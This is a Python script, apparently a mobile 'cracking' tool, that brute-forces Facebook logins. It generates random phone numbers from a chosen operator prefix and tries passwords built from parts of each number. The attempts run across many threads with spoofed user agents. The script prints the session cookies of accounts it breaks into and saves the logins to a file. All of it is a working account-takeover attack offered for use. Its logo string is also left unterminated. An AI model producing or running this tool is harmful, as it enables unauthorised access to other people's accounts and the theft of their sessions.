#!/usr/bin/python3
import os,re,sys,random,string,time
from os import system as EHC
try:
    import requests
except:
    os.system("pip install requests")
    import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime 
from string import *
dateti=str(datetime.now()).split(" ")[0]
logo="""
 __          __   _     _     _ 
 \ \        / /  | |   (_)   | |
  \ \  /\  / /_ _| |__  _  __| |
   \ \/  \/ / _` | '_ \| |/ _` |
    \  /\  / (_| | | | | | (_| |
     \/  \/ \__,_|_| |_|_|\__,_|
                                
                                
def line():
    print("—"*36)
def sykology():
    emran=[]
    EHC("clear")
    print(logo)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46mᴠͥɪͣᴘͫ✮⃝𝑾𝑶𝑹𝑲=BGCT(WAHID)𝄟⃝✔️")
    print(" \033[38;5;46m=============================")
    print(" [𝑺𝑰𝑴𝑬 𝑪𝑶𝑫𝑬] 𝟎𝟏𝟖/𝟎𝟏𝟕/𝟎𝟏𝟗/𝟎𝟏𝟔/𝟎𝟏𝟓")
    ehc_code=input(" 𝑪𝑯𝑶𝑰𝑪𝑹 𝑺𝑰𝑴 𝑪𝑶𝑫𝑬:")
    line()    
    print(" \033[38;5;46mᴠͥɪͣᴘͫ✮⃝𝑾𝑶𝑹𝑲=BGCT(WAHID)𝄟⃝✔️")
    print(" \033[38;5;46m=============================")
    print(" [𝑳𝑴𝑻]-[𝟏𝟎𝟎𝟎]-[𝟐𝟎𝟎𝟎]-[𝟑𝟎𝟎𝟎]-[𝟒𝟎𝟎𝟎]")
    print(" \033[38;5;46m=============================")
    ehc_lim=int(input(" 𝑪𝑯𝑶𝑰𝑪𝑬 𝑳𝑴𝑻 :"))    
    line()
    for z in range(ehc_lim):
        co=''.join(random.choice(string.digits) for _ in range(8))
        emran.append(co)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46mᴠͥɪͣᴘͫ✮⃝𝑾𝑶𝑹𝑲=BGCT(WAHID)𝄟⃝✔️")
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m[𝑬𝑯𝑪𝟎𝟏] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑴")
    print(" \033[38;5;46m[𝑬𝑯𝑪𝟎𝟐] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑴𝑩𝑨𝑺𝑰𝑪")
    print(" \033[38;5;46m[𝑬𝑯𝑪𝟎𝟑] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑷𝑭𝑹𝑬𝑬")
    print(" \033[38;5;46m[𝑬𝑯𝑪𝟎𝟒] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑷")
    print(" \033[38;5;46m[𝑬𝑯𝑪𝟎𝟓] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑿")
    print(" \033[38;5;46m[𝑬𝑯𝑪𝟎𝟔] ᴠͥɪͣᴘͫ✮⃝𝑼𝑷𝑫𝑨𝑻𝑬𝄟⃝✔️ 𝑻𝑶𝑼𝑪𝑯") 
    print(" \033[38;5;46m=============================")
    line()
    gxd=input(" [✔️]𝑪𝑯𝑶𝑰𝑪𝑬 𝑼𝑷𝑫𝑨𝑻𝑬 𝑵𝑼𝑴𝑩𝑬𝑹:")
    if gxd in ["EHC1","M"]:
        fb="m"
        fb1="M1"
    elif gxd in ["EHC2","Mbasic"]:
        fb="mbasic"
        fb1="M2"
    elif gxd in ["EHC3","Free"]:
        fb="free"
        fb1="M3"
    elif gxd in ["EHC4","P"]:
        fb="p"
        fb1="M4"
    elif gxd in ["EHC5","X"]:
        fb="x"
        fb1="M5"
    else:
        fb="touch"
        fb1="M6"
    with ThreadPool(max_workers=100) as feel:
        EHC("clear")
        print(logo)
        tl=str(len(emran))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mEmran-ok.txt") 
        print(f"    \033[38;5;46mCRACK ID\033[38;5;196m>> \033[38;5;49m{tl} \033[38;5;50m[{dateti}]") 
        line()
        for id in emran:
            uid=ehc_code+id
            pwx=[]
            pwx.append(uid[5:])#back 6
            pwx.append(uid[4:])#back 7
            pwx.append(uid[3:])#back 8
            pwx.append(uid[:6])#front 6
            pwx.append(uid[:7])#front 7
            pwx.append(uid[:8])#front 8
            pwx.append(uid)
            feel.submit(random_subb,uid,pwx,fb,fb1)
oks=[]
cps=[]
ugen=[]
loop=0

try:
    proxx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
except:
    print(" [✓] INTERNET CONNECTION ERROR")
    sys.exit()
open('.prox.txt','w').write(proxx)
pxx=open(".prox.txt","r").read().splitlines()

for xd in range(50000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

def random_subb(uid,pwx,fb,fb1):
    global oks,cps,ugen,loop
    sys.stdout.write(f"\r\033[38;5;46m[✮⃝WAHID𝄟⃝✔️ ᴠͥɪͣᴘͫ] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            uuu=random.choice(ugen)
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            eehhcc=session.cookies.get_dict().keys()
            if "c_user" in eehhcc:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                sort=coki.split("sb=")[1]
                coki1=coki.split("1000")[1]
                xd="1000"+coki1[0:11]
                print(f"""❴\033[38;5;46m𝙊𝙆 𝙄𝘿_❵]
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 WAHID\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[33;1m𝘾𝙊𝙊𝙆𝙀𝙎❴\033[38;5;46m𝙇𝙄𝙏𝙀+𝙇𝙊𝙂𝙄𝙉❵\033[37;1m : {coki}
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 WAHID\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     WAHID 𝘽𝙊𝙎𝙎 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     WAHID 𝘽𝙊𝙎𝙎 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open("/sdcard/WAHID-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
        loop+=1      
    except:
        time.sleep(3)
sykology()



